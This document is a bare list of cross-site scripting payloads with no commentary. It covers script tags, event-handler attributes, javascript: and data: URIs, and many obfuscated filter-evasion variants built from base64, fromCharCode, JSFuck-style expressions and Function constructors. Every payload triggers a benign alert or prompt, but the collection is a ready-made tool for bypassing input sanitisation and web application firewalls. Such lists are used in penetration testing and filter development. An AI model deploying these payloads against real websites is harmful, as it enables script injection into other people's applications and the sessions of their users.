 <script>prompt(1)</script>
    <script>confirm(1)</script>
    <script>
    var fn=window[490837..toString(1<<5)];
    fn(atob('YWxlcnQoMSk='));
    </script>
    <script>
    var fn=window[String.fromCharCode(101,118,97,108)];
    fn(atob('YWxlcnQoMSk='));
    </script>
    <script>
    var fn=window[atob('ZXZhbA==')];
    fn(atob('YWxlcnQoMSk='));
    </script>
    <script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
    <script>this[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
    <script>this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])</script>
    <script>this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))</script>
    <script>'str1ng'.replace(/1/,alert)</script>
    <script>'bbbalert(1)cccc'.replace(/a\w{4}\(\d\)/,eval)</script>
    <script>'a1l2e3r4t6'.replace(/(.).(.).(.).(.).(.)/, function(match,$1,$2,$3,$4,$5) { this[$1+$2+$3+$4+$5](1); })</script>
    <script>eval('\\u'+'0061'+'lert(1)')</script>
    <script>throw~delete~typeof~prompt(1)</script>
    <script>delete[a=alert]/prompt a(1)</script>
    <script>delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)</script>
    <script>(()=>{return this})().alert(1)</script>
    <script>new function(){new.target.constructor('alert(1)')();}</script>
    <script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>
    <link/rel=prefetch
import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
    <link rel="import" href="data:x,<script>alert(1)</script>
    <script>Array.from`1${alert}3${window}2`</script>
    <script>!{x(){alert(1)}}.x()</script>
    <script>Array.from`${eval}alert\`1\``</script>
    <script>Array.from([1],alert)</script>
    <script>Promise.reject("1").then(null,alert)</script>
    <svg </onload ="1> (_=alert,_(1)) "">
    javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
    <marquee loop=1 width=0 onfinish=alert(1)>
    <p onbeforescriptexecute="alert(1)"><svg><script>\</p>
    <img onerror=alert(1) src <u></u>
    <videogt;<source onerror=javascript:prompt(911)gt;
    <base target="<script>alert(1)</script>"><a href="javascript:name">CLICK</a>
    <base href="javascript:/"><a href="**/alert(1)"><base href="javascript:/"><a href="**/alert(1)">
    <style>@KeyFrames x{</style><div style=animation-name:x onanimationstart=alert(1)> <
    <script>```${``[class extends[alert``]{}]}```</script>
    <script>[class extends[alert````]{}]</script>
    <script>throw new class extends Function{}('alert(1)')``</script>
    <script>x=new class extends Function{}('alert(1)'); x=new x;</script>
    <script>new class extends alert(1){}</script>
    <script>new class extends class extends class extends class extends alert(1){}{}{}{}</script>
    <script>new Image()[unescape('%6f%77%6e%65%72%44%6f%63%75%6d%65%6e%74')][atob('ZGVmYXVsdFZpZXc=')][8680439..toString(30)](1)</script>
    <script src=data:,\u006fnerror=\u0061lert(1)></script>
    "><svg><script/xlink:href="data:,alert(1)
    <svg><script/xlink:href=data:,alert(1)></script>
    <frameset/onpageshow=alert(1)>
    <div onactivate=alert('Xss') id=xss style=overflow:scroll>
    <div onfocus=alert('xx') id=xss style=display:table>